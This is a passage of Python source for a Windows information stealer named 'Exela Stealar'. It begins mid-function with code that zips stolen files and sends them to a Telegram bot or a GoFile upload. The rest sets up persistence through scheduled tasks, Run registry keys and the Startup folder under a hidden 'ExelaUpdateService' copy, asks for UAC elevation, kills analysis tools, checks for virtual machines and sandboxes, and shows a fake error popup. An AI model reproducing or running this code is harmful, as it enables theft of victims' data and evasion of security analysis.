                            f"https://api.telegram.org/bot{TELEGRAM_TOKEN}/sendDocument",
                            data=form
                        )
                else:
                    uploaded_url = await UploadGoFile.upload_file(zip_path)
                    if uploaded_url:
                        await session.post(
                            f"https://api.telegram.org/bot{TELEGRAM_TOKEN}/sendMessage",
                            json={"chat_id": TELEGRAM_CHAT_ID, "text": f"Files Download Link: {uploaded_url}"}
                        )
            try:
                os.remove(zip_path)
                shutil.rmtree(destination_directory)
            except Exception as e:
                logging.error(f"Error cleaning up stolen files: {e}")
        except Exception as e:
            logging.error(f"Error stealing common files: {e}")

class Startup:
    def __init__(self) -> None:
        self.LocalAppData = os.getenv("LOCALAPPDATA")
        self.RoamingAppData = os.getenv("APPDATA")
        self.CurrentFile = os.path.abspath(sys.argv[0])
        self.Privalage = SubModules.IsAdmin()
        self.ToPath = os.path.join(self.LocalAppData, "ExelaUpdateService", "Exela.exe")

    async def main(self) -> None:
        await self.CreatePathAndMelt()
        print("[+] Started startup injection")
        if STARTUP_METHOD == "schtasks":
            await self.SchtaskStartup()
        elif STARTUP_METHOD == "regedit":
            await self.RegeditStartup()
        elif STARTUP_METHOD == "folder":
            await self.FolderStartup()
        else:
            logging.error("Unsupported startup method")
        print("[+] Successfully executed startup injection")

    async def CreatePathAndMelt(self) -> None:
        try:
            if os.path.exists(self.ToPath):
                return
            os.makedirs(os.path.dirname(self.ToPath), exist_ok=True)
            shutil.copyfile(self.CurrentFile, self.ToPath)
            await asyncio.create_subprocess_shell(
                f'attrib +h +s "{self.ToPath}"',
                stdout=asyncio.subprocess.PIPE,
                stderr=asyncio.subprocess.PIPE,
                shell=True
            )
        except Exception as e:
            logging.error(f"Error creating path and melting: {e}")

    async def SchtaskStartup(self) -> None:
        try:
            process = await asyncio.create_subprocess_shell(
                'schtasks /query /TN "ExelaUpdateService"',
                shell=True,
                stdout=asyncio.subprocess.PIPE,
                stderr=asyncio.subprocess.PIPE
            )
            stdout, _ = await process.communicate()
            if not stdout:
                if self.Privalage:
                    onLogonCommand = f'schtasks /create /f /sc onlogon /rl highest /tn "ExelaUpdateService" /tr "{self.ToPath}"'
                    everyOneHour = f'schtasks /create /f /sc hourly /mo 1 /rl highest /tn "ExelaUpdateService2" /tr "{self.ToPath}"'
                    await asyncio.create_subprocess_shell(onLogonCommand, stdout=asyncio.subprocess.PIPE, stderr=asyncio.subprocess.PIPE, shell=True)
                    await asyncio.create_subprocess_shell(everyOneHour, stdout=asyncio.subprocess.PIPE, stderr=asyncio.subprocess.PIPE, shell=True)
                else:
                    result = ctypes.windll.shell32.ShellExecuteW(None, "runas", sys.executable, " ".join(sys.argv), None, 1)
                    if result > 32:
                        os._exit(0)
                    else:
                        command = f'schtasks /create /f /sc daily /ri 30 /tn "ExelaUpdateService" /tr "{self.ToPath}"'
                        await asyncio.create_subprocess_shell(command, stdout=asyncio.subprocess.PIPE, stderr=asyncio.subprocess.PIPE, shell=True)
        except Exception as e:
            logging.error(f"Error setting up schtasks startup: {e}")

    async def RegeditStartup(self) -> None:
        try:
            key = "HKEY_LOCAL_MACHINE" if self.Privalage else "HKEY_CURRENT_USER"
            command = f'reg add {key}\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run /v "Exela Update Service" /t REG_SZ /d "{self.ToPath}" /f'
            await asyncio.create_subprocess_shell(command, stdout=asyncio.subprocess.PIPE, stderr=asyncio.subprocess.PIPE, shell=True)
        except Exception as e:
            logging.error(f"Error setting up regedit startup: {e}")

    async def FolderStartup(self) -> None:
        try:
            startup_path = (
                r"C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp\Exela.exe"
                if self.Privalage
                else os.path.join(self.RoamingAppData, "Microsoft", "Windows", "Start Menu", "Programs", "Startup", "Exela.exe")
            )
            if not os.path.isfile(startup_path):
                shutil.copy(self.CurrentFile, startup_path)
            else:
                print("[+] File already in startup")
        except Exception as e:
            logging.error(f"Error setting up folder startup: {e}")

class AntiDebug:
    def __init__(self) -> None:
        self.banned_uuids = [
            "7AB5C494-39F5-4941-9163-47F54D6D5016", "7204B444-B03C-48BA-A40F-0D1FE2E4A03B",
            "88F1A492-340E-47C7-B017-AAB2D6F6976C", "129B5E6B-E368-45D4-80AB-D4F106495924",
            # ... (остальные UUID из оригинала)
        ]
        self.banned_computer_names = [
            "WDAGUtilityAccount", "Harry Johnson", "JOANNA", "WINZDS-21T43RNG", "Abby",
            # ... (остальные имена из оригинала)
        ]
        self.banned_process = [
            "HTTP Toolkit.exe", "httpdebuggerui.exe", "wireshark.exe", "fiddler.exe",
            # ... (остальные процессы из оригинала)
        ]

    async def FunctionRunner(self):
        print("[+] Anti Debugging Started")
        tasks = [
            asyncio.create_task(self.check_system()),
            asyncio.create_task(self.kill_process())
        ]
        await asyncio.gather(*tasks)
        print("[+] Anti Debug Successfully Executed")

    async def check_system(self) -> None:
        try:
            cmd = "wmic csproduct get uuid"
            process = await asyncio.create_subprocess_shell(
                cmd, stdout=asyncio.subprocess.PIPE, stderr=asyncio.subprocess.PIPE, shell=True
            )
            stdout, _ = await process.communicate()
            get_uuid = stdout.decode(errors="ignore").split("\n")[1].strip()
            get_computer_name = os.getenv("computername")

            if get_uuid in self.banned_uuids:
                print("HWID detected")
                os._exit(0)
            if get_computer_name in self.banned_computer_names:
                print("Computer name detected")
                os._exit(0)
        except Exception as e:
            logging.error(f"Error checking system: {e}")

    async def kill_process(self) -> None:
        try:
            process_list = await asyncio.create_subprocess_shell(
                'tasklist', stdout=asyncio.subprocess.PIPE, stderr=asyncio.subprocess.PIPE, shell=True
            )
            stdout, _ = await process_list.communicate()
            stdout = stdout.decode(errors="ignore").lower()
            for proc in self.banned_process:
                if proc.lower() in stdout:
                    await asyncio.create_subprocess_shell(
                        f'taskkill /F /IM "{proc}"',
                        stdout=asyncio.subprocess.PIPE,
                        stderr=asyncio.subprocess.PIPE,
                        shell=True
                    )
        except Exception as e:
            logging.error(f"Error killing processes: {e}")

class AntiVM:
    async def FunctionRunner(self) -> None:
        print("[+] Anti-VM started")
        tasks = [
            asyncio.create_task(self.CheckGpu()),
            asyncio.create_task(self.CheckHypervisor()),
            asyncio.create_task(self.CheckHostName()),
            asyncio.create_task(self.CheckDisk()),
            asyncio.create_task(self.CheckDLL()),
            asyncio.create_task(self.CheckGDB()),
            asyncio.create_task(self.CheckProcess()),
        ]
        results = await asyncio.gather(*tasks)
        if any(results):
            print("[+] Anti-VM detected VM machines")
            try:
                os._exit(0)
            except:
                sys.exit(0)
        print("[+] Anti-VM executed successfully, no VM detected")

    async def CheckGpu(self) -> bool:
        try:
            process = await asyncio.create_subprocess_shell(
                'wmic path win32_VideoController get name',
                stdout=asyncio.subprocess.PIPE,
                stderr=asyncio.subprocess.PIPE,
                shell=True
            )
            stdout, _ = await process.communicate()
            return any(x.lower() in stdout.decode(errors='ignore').lower() for x in ("virtualbox", "vmware"))
        except Exception as e:
            logging.error(f"Error checking GPU: {e}")
            return False

    async def CheckHostName(self) -> bool:
        try:
            hostNames = ['sandbox', 'cuckoo', 'vm', 'virtual', 'qemu', 'vbox', 'xen']
            hostname = platform.node().lower()
            return any(name in hostname for name in hostNames)
        except Exception as e:
            logging.error(f"Error checking hostname: {e}")
            return False

    async def CheckDisk(self) -> bool:
        try:
            return any(os.path.isdir(path) for path in ('D:\\Tools', 'D:\\OS2', 'D:\\NT3X'))
        except Exception as e:
            logging.error(f"Error checking disk: {e}")
            return False

    async def CheckDLL(self) -> bool:
        try:
            ctypes.windll.LoadLibrary("SbieDll.dll")
            return True
        except Exception:
            return False

    async def CheckGDB(self) -> bool:
        try:
            process = await asyncio.create_subprocess_shell(
                "gdb --version",
                stdout=asyncio.subprocess.PIPE,
                stderr=asyncio.subprocess.PIPE,
                shell=True
            )
            stdout, _ = await process.communicate()
            return b"GDB" in stdout
        except Exception:
            return False

    async def CheckProcess(self) -> bool:
        try:
            banned_processes = [
                "vmtoolsd.exe", "vmwaretray.exe", "vmacthlp.exe", "vboxtray.exe",
                "vboxservice.exe", "vmsrvc.exe", "prl_tools.exe", "xenservice.exe"
            ]
            process = await asyncio.create_subprocess_shell(
                "tasklist", stdout=asyncio.subprocess.PIPE, stderr=asyncio.subprocess.PIPE, shell=True
            )
            stdout, _ = await process.communicate()
            return any(proc in stdout.decode().lower() for proc in banned_processes)
        except Exception as e:
            logging.error(f"Error checking processes: {e}")
            return False

    async def CheckHypervisor(self) -> bool:
        try:
            process = await asyncio.create_subprocess_shell(
                'wmic computersystem get Manufacturer',
                stdout=asyncio.subprocess.PIPE,
                stderr=asyncio.subprocess.PIPE,
                shell=True
            )
            stdout, _ = await process.communicate()
            return b'VMware' in stdout or b"vmware" in stdout.decode().lower()
        except Exception as e:
            logging.error(f"Error checking hypervisor: {e}")
            return False

async def Fakerror() -> None:
    try:
        if FAKE_ERROR[0] and os.path.abspath(sys.argv[0]) != os.path.join(os.getenv("LOCALAPPDATA"), "ExelaUpdateService", "Exela.exe"):
            title = FAKE_ERROR[1][0].replace("\x22", "\\x22").replace("\x27", "\\x22")
            message = FAKE_ERROR[1][1].replace("\x22", "\\x22").replace("\x27", "\\x22")
            cmd = f'mshta "javascript:var sh=new ActiveXObject(\'WScript.Shell\'); sh.Popup(\'{message}\', 0, \'{title}\', {FAKE_ERROR[1][2]}+16);close()"'
            await asyncio.create_subprocess_shell(cmd, shell=True)
    except Exception as e:
        logging.error(f"Error displaying fake error: {e}")

if __name__ == '__main__':
    if os.name == "nt":
        if not SubModules.create_mutex("Exela | Stealar | on top |"):
            print("Mutex already exists")
            os._exit(0)
        start_time = time.time()
        if ANTI_VM:
            asyncio.run(AntiVM().FunctionRunner())
        asyncio.run(AntiDebug().FunctionRunner())
        if STARTUP_METHOD != "no-startup":
            asyncio.run(Startup().main())
        asyncio.run(Fakerror())
        main_instance = Main()
        asyncio.run(main_instance.FunctionRunner())
        if STEAL_FILES:
            asyncio.run(StealCommonFiles().StealFiles())
        print(f"\nCode executed in: {time.time() - start_time:.2f} seconds")
    else:
        print("Only Windows OS supported by Exela")